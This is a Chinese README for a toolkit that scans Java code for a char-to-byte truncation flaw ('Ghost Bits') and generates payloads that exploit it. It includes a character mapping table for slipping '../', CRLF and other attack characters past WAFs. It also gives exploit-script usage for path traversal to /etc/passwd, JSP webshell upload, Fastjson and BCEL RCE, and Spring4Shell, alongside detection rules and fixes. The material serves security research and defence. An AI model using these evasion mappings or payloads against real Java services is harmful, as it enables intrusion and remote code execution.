# Ghost Bits Toolkit

Java 幽灵比特位（Ghost Bits）漏洞检测与利用工具包。

## 漏洞背景

Ghost Bits（幽灵比特位）是 Black Hat Asia 2026 上披露的 Java 生态底层安全缺陷。该漏洞源于 Java 中 `char`（16 位）与 `byte`（8 位）之间强制类型转换时高位静默丢弃的行为。

**核心危害**：安全检测链路（WAF/IDS）与应用执行链路对同一输入的解析语义不一致——前置防护看到的是"无害"的 Unicode 字符，而后端执行时却恢复为危险 ASCII 攻击载荷。

**影响范围**：Tomcat、Jetty、Spring、Fastjson、Jackson、Openfire、BCEL、Apache HttpClient 等主流 Java 框架与中间件。

## 核心原理

```
char (16 位 UTF-16)  →  (byte) 强制转换  →  byte (8 位)
                                           高 8 位被静默丢弃
                                           低 8 位 = 危险 ASCII 字符
```

示例：`陪`（U+966A）→ `(byte)` 转换 → `0x6A` → `'j'`

攻击者可以用 Ghost Bits 字符替换攻击 payload 中的关键 ASCII 字符，WAF 看到的是无害中文，后端 Java 服务解析后还原为攻击载荷。

## 工具组成

### 1. 检测脚本（ghost_bits_scanner.py）

扫描 Java 源代码中的 Ghost Bits 危险写法：

```bash
# 扫描目录
python src/ghost_bits_scanner.py ./src

# 扫描指定文件类型
python src/ghost_bits_scanner.py ./project --ext .java,.jsp

# JSON 格式输出
python src/ghost_bits_scanner.py ./src --json

# 列出所有检测规则
python src/ghost_bits_scanner.py /dev/null --rules
```

**检测规则（10 条）**：

| 规则 ID | 严重程度 | 检测内容 |
|---------|---------|---------|
| GB-001 | HIGH | `(byte) char` 强制转换 |
| GB-002 | HIGH | `& 0xFF` / `& 255` 位运算截断 |
| GB-003 | MEDIUM | `OutputStream.write(int)` |
| GB-004 | HIGH | `DataOutputStream.writeBytes()` |
| GB-005 | HIGH | 废弃 `String.getBytes(int,...)` |
| GB-006 | MEDIUM | `URLDecoder.decode()` 宽松解码 |
| GB-007 | MEDIUM | `Character.digit()` 宽松转换 |
| GB-008 | HIGH | `RandomAccessFile.writeBytes()` |
| GB-009 | HIGH | `StringBufferInputStream` |
| GB-010 | LOW | 自定义 Hex 解码 |

### 2. 利用脚本（ghost_bits_exploit.py）

生成 Ghost Bits 绕过 payload，支持 7 种攻击场景：

```bash
# 路径穿越（Spring CVE-2025-41242）
python src/ghost_bits_exploit.py -s path-traversal -t /etc/passwd

# 文件上传绕过
python src/ghost_bits_exploit.py -s file-upload -f shell.jsp

# CRLF 注入
python src/ghost_bits_exploit.py -s crlf-inject

# Fastjson 反序列化
python src/ghost_bits_exploit.py -s fastjson-rce --cmd "whoami"

# Spring4Shell class 关键字绕过
python src/ghost_bits_exploit.py -s spring4shell

# BCEL 反序列化绕过
python src/ghost_bits_exploit.py -s bcel-rce

# 自定义 payload
python src/ghost_bits_exploit.py -s custom -p "class.module.classLoader"

# 使用不同的 Ghost Bits 变体
python src/ghost_bits_exploit.py -s path-traversal -v 1
```

## 典型 Ghost Bits 映射表

| 目标 ASCII | Hex | Ghost Bits 字符 | Unicode |
|-----------|-----|----------------|---------|
| `.` | 0x2E | 阮 | U+962E |
| `/` | 0x2F | 丯 | U+4E2F |
| `%` | 0x25 | 严 | U+4E25 |
| `j` | 0x6A | 陪 | U+966A |
| `s` | 0x73 | 乳 | U+4E73 |
| `p` | 0x70 | 买 | U+4E70 |
| `@` | 0x40 | 乀 | U+4E40 |
| `\r` | 0x0D | 瘍 | U+760D |
| `\n` | 0x0A | 瘊 | U+760A |

**WAF 绕过统计学证明**：仅 CJK 基本汉字区（U+4E00 ~ U+9FFF），每个 ASCII 字符有 82 个可选 Ghost Bits 替换体。构造 `../` 的组合数：82 × 82 × 82 = **551,368 种**，WAF 无法全部拦截。

## 修复建议

1. **删除危险代码写法**：审计并移除 `(byte) ch`、`ch & 0xFF`、`baos.write(ch)` 等
2. **使用指定编码**：处理字符串时明确指定 `Charset`（如 UTF-8）
3. **输入规范化**：对高风险字段做字符集白名单校验
4. **拒绝异常字符**：明确拒绝不可见控制字符和异常混淆字符
5. **WAF 升级**：部署支持 Unicode 规范化检测的 WAF 规则

## 受影响组件与 CVE

| 组件 | CVE | 漏洞类型 |
|------|-----|---------|
| Spring + Jetty | CVE-2025-41242 | 路径穿越 |
| Openfire | CVE-2023-32315 | 认证绕过 |
| Spring | CVE-2022-22965 (Spring4Shell) | RCE |
| GeoServer | CVE-2024-36401 | RCE |
| JDK HttpServer | CVE-2026-21933 | 请求走私 |
| Tomcat | — | 文件上传 |
| Fastjson | — | 反序列化 RCE |
| Jackson | — | SQL 注入/RCE |
| Apache BCEL | — | 反序列化 RCE |
| Apache HttpClient ≤4.5.9 | — | 请求走私 |
| Angus Mail | — | SMTP 注入 |

## 参考资料

- Black Hat Asia 2026: "Cast Attack: A New Threat Posed by Ghost Bits in Java" by Xinyu Bai (浅蓝) & Zhihui Chen (1ue)
- Spring CVE-2025-41242 PoC: https://github.com/vulhub/vulhub/blob/master/spring/CVE-2025-41242/

## License

MIT
